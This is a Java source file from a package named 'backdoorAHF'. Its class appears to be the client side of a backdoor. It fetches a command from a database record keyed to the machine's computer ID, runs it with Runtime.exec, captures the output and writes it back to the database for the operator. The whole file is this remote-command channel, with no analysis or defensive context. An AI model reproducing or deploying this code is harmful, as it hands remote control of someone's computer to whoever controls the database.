package org.backdoorAHF.service;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import org.backdoorAHF.dom.Querys;
import org.hibernate.*;
import org.hibernate.cfg.Configuration;
import org.springframework.context.support.ClassPathXmlApplicationContext;



public class Conection {

	public static String request()
	{
		
		return null;
		
	}
	
	public static void questionToServer() throws Exception
	{
	
		
		 
        
		ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("/spring.xml");
		Querys quer = (Querys) context.getBean("querys");
	    System.out.println(quer.getComputerId());
	    context.close();
		
		
		@SuppressWarnings("deprecation")
		SessionFactory sessionFactory = new Configuration().configure().buildSessionFactory();
		
		Session sess1 = sessionFactory.openSession();
	
		sess1.beginTransaction();
		quer = (Querys) sess1.get(Querys.class, quer.getComputerId());
		sess1.getTransaction().commit();
		sess1.close();
		
		if (!(quer.getCommand().equals("")))
		{
		try {
			Thread.sleep(2000);
		} catch (InterruptedException e) {
		}
		
		 Process p;
		try {
			p = Runtime.getRuntime().exec(quer.getCommand());
		    
         BufferedReader stdInput = new BufferedReader(new InputStreamReader(
                         p.getInputStream()));
         String s;
         quer.setRequest("");
         quer.setCommand("");
         while ( (s = stdInput.readLine()) != null) {
             quer.setRequest(quer.getRequest()+(char)13 +s);
         }
		} catch (Exception e) {
			
		}
		
		
		Session session = sessionFactory.openSession();
		session.delete(session.get(Querys.class, quer.getComputerId()));
		session.beginTransaction();
		session.save(quer);
		session.getTransaction().commit();
		session.close();
		}
	}
}
